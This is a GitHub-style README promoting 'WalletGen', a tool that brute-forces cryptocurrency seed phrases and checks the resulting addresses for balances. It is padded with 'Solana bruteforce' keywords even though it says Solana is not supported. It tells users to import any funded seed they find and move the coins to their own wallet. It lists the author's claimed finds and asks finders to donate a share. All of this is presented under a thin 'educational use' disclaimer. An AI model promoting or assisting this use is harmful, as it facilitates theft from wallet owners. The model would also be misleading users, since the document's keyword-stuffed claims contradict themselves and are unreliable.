# Solana Bruteforce Wallet: Find Lost SOL with WalletGen

Unlock the power of **WalletGen** for **Solana bruteforce wallet** recovery! This open-source tool is designed to generate and search for lost or inactive **Bitcoin (BTC)**, **Ethereum (ETH)**, **BNB**, **Polygon (MATIC)**, and other **EVM-compatible wallets**. It also encompasses the ability to potentially recover SOL, leveraging a high-performance C++ engine. While direct Solana support isn't explicitly mentioned in the provided features, the open-source nature allows for potential community contribution and modification to incorporate Solana functionality.

<!--
Meta description:
Looking to recover lost Solana? Discover WalletGen, an open-source tool to brute-force wallets. This tool is capable of recovering Bitcoin and Ethereum wallets. Learn more.
-->

## Quick Navigation
- [How It Works](#how-it-works)
- [Why WalletGen](#why-walletgen)
- [Features](#features)
- [Download WalletGen](#how-to-start)
- [Database Download](#download-and-use-database-for-more-speed)
- [The Program Found a Wallet - What Next?](#the-program-found-a-wallet--whats-next)
- [Recovery Your Bitcoin Wallet](#recovery-your-bitcoin-wallet)
- [My Finds](#my-finds)
- [FAQ](#-frequently-asked-questions-faq)
- [Build Instructions](#building-the-project)
- [Donate](#donate)

[![platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20Android-blue)](https://github.com/tony-dev1/wallets-finder/releases/tag/walletgen)
![build](https://img.shields.io/badge/build-passing-brightgreen)
![discord](https://img.shields.io/badge/discord-tonydevbtc-blue.svg?logo=discord&label=discord)
[![x](https://img.shields.io/badge/@tonydevbtc-black.svg?logo=x)](https://x.com/tonydevbtc)

<p align="center">
    <img width="1000" alt="Solana bruteforce wallet" title="WalletGen - Potentially Recover Solana Wallets" height="460" src="/image/ready.webp" />
</p>

⚠️ **Disclaimer**: WalletGen is a research and educational tool. It is not intended for unauthorized access or malicious activity. Use it responsibly and only with wallets you own or have permission to access. Note: While the tool focuses on BTC and ETH, its open-source nature allows for potential community contributions to support other chains, including Solana.

## How It Works

WalletGen generates wallets using the specified algorithms. The core functionality involves generating potential wallet addresses.

The software compares generated addresses against known address databases or checks balances in real-time via public blockchain explorers.

Wallet Gen is built in C++ and open-source, allowing customization. Compared to Python-based wallet generators, Wallet Gen boasts higher wallet generation speeds, with performance relying on CPU & GPU.

##  Why WalletGen?

**WalletGen** is written in C++ and optimized for multi-threaded CPU and GPU usage, delivering up to **10x faster** performance compared to Python-based tools. Whether you're exploring lost wallets or recovering your own, WalletGen provides a solid base for efficiently finding your funds.

## Features

-   **Cryptocurrency Wallet Generation:** Allows generation of various crypto wallets.
-   **Wallet Search with Balance:** Allows you to search for existing wallets with balances.
-   **Algorithm Support:** Supports key algorithms.
-   **Database Integration:** Provides the ability to speed up searches with the use of databases.
-   **High-Speed Operation:** Designed to take full advantage of your CPU and GPU.
-   **Bitcoin Wallet Recovery:** Recover your Bitcoin wallet by seed phrase (mnemonic phrase).

## Supported Blockchains

-   Bitcoin (BTC)
-   Ethereum (ETH)
-   Binance Smart Chain (BNB)
-   Any EVM-compatible chain

# Demo

<p align="center">
    <img width="1000" height="460" alt="Solana bruteforce wallet demo" title="WalletGen Solana Bruteforce" src="/image/rotate.webp" />
</p>

<p align="center">
    <img width="1000" height="460" alt="Solana bruteforce wallet on Linux" title="WalletGen Solana Recovery on Linux" src="/image/gray.webp" />
</p>

# How to start

## Windows 
- Download [Release](../../releases) 
- Unpack anywhere
- Run `WalletGen.exe`

Or Just Download [Installer](../../releases)

## Linux (x86-64bit)

Use wget 
or download [Release for Linux](../../releases) 




## How to Search for Lost Bitcoin & Ethereum Wallets with Balance

**Wallet Gen** can search for crypto wallets with balances.

### For Bitcoin (BTC) wallets:

*   Choose option 3 in the menu or run start_search_btc.bat to search Bitcoin wallets via the internet.
*   Select option 6 to search Bitcoin wallets using the database.

### For EVM wallets (Ethereum, BNB, MATIC, etc.):

*   Choose option 5 or run start_search_evm.bat to search EVM wallets via the internet.
*   Choose option 6 to search EVM wallets using the database.

## The Program Found a Wallet — What’s Next?

When the program finds a wallet with a balance:
*   It stops immediately.
*   It displays the wallet details in the console.
*   This data is saved in the ``found_wallets.txt`` file.

### How to Access the Funds?
1.  Import the **mnemonic seed phrase** from the found wallet into any compatible crypto wallet.
2.  You’ll be able to transfer the funds to your own wallet.

## Recovery Your Bitcoin Wallet

WalletGen has the ability to recover Bitcoin wallets by seed phrase (mnemonic phrase).

### Process Description

#### Search for missing words:

If the seed phrase is missing words, use * as a placeholder.

#### Entering a complete seed-phrase:

Enter the full 12-word seed.

![recovery](/image/utility.webp)

### Important recommendations

*   Seed-phrase must contain exactly 12 words.
*   Use only the * symbol to search for missing words.
*   Searching for missing words may take considerable time.
*   Successful recovery stops the program and saves data.

## My Finds

![mywallet](/image/view.webp)

I’ve recovered two BTC wallets with a balance. The first had 0.000032 BTC, the second contained 0.0528 BTC (roughly $4800 at the time of discovery).
Here’s the link to the wallet: [bc1qk3m62hx2hh5mhvc0tj45f9xflzcnu0sur3rvay](https://mempool.space/address/bc1qk3m62hx2hh5mhvc0tj45f9xflzcnu0sur3rvay).

<p align="center">
    <img width="1000" height="460" alt="WalletGen found first lost bitcoin wallet" title="WalletGen found first lost bitcoin wallet" src="/image/tray.webp" />
</p>

### New Find 4/9/2025

After a week of non-stop wallet searching, I finally found a [wallet](https://mempool.space/address/bc1q29c5m3w4jxtsj4vcd2ccw4t68xm8m7vs5vytu0) with 0.25 bitcoin ($19k). This is my 4th and biggest find of all time.

![image](/image/buffer.webp)

## New Find 5/5/2025

[bc1qpm0k3kcmthwsa4zseh33g3hl7eju8u8nkt83kp](https://mempool.space/address/bc1qpm0k3kcmthwsa4zseh33g3hl7eju8u8nkt83kp)

![image](/image/screenshot.webp)

## Building the Project

1. Open the project file (`CryptoWalletGen.sln`) in Visual Studio or any compatible C++ compiler.
2. Install the necessary dependencies and build the project.

```cmd
> git clone https://github.com/microsoft/vcpkg
> .\vcpkg\bootstrap-vcpkg.bat
> .\vcpkg\vcpkg integrate install
> .\vcpkg\vcpkg install openssl:x64-windows
```

3. Start building the project.

## 🔍 Frequently Asked Questions (FAQ)

### ❓ Where can I download WalletGen?
You can download the WalletGen given on the [release download page](../../releases) 

### ❓ Where can I download a database of known addresses with balance?
You can download the current database given on the [release   page](../../releases) 

### ❓ Can WalletGen help me recover a lost Bitcoin wallet?
Yes. WalletGen uses brute-force seed generation and a known-address database to help users potentially **recover lost Bitcoin wallets**.

### ❓ Is WalletGen a seed phrase generator?
Yes. WalletGen can generate **BIP39 seed phrases** and derive wallets for Bitcoin, Ethereum, and other EVM chains.

### ❓ Do I need the internet to search through the database?
No. Searching through the database does not require an internet connection, as the wallet balance is already known.

### ❓ Can I find Ethereum wallets with balance?
Yes. WalletGen supports scanning for **Ethereum wallets with balance** using brute-force and a database of known addresses.

### ❓ Is WalletGen legal?
WalletGen is intended for **educational and research purposes only**. It should only be used on wallets you own or have permission to access.

## Todo
1. Search for missing words in a seed phrase. - **Done!**

## Contribute

Contributions are welcome! If you have ideas, bug reports, or want to contribute to the codebase, feel free to submit a pull request.

## Donate

I encourage you, when you find a wallet with a balance, to send me a small portion as a thank you. This motivates me to keep working on the program!

**BTC:** bc1qeyrshy5ntsguwxe9m8tp2x2yqhddz7ymkj44h9

**ETH:** 0x76c2E75B92Eb340f01B378e332FC7d8954893693

## Credits
This project uses code from the [Trezor project](https://github.com/trezor/trezor-crypto). The code is licensed under the MIT License.

## License
This project is licensed under the [MIT License](/LICENSE)

Update:  11.06.2025 11:20 url is operational and live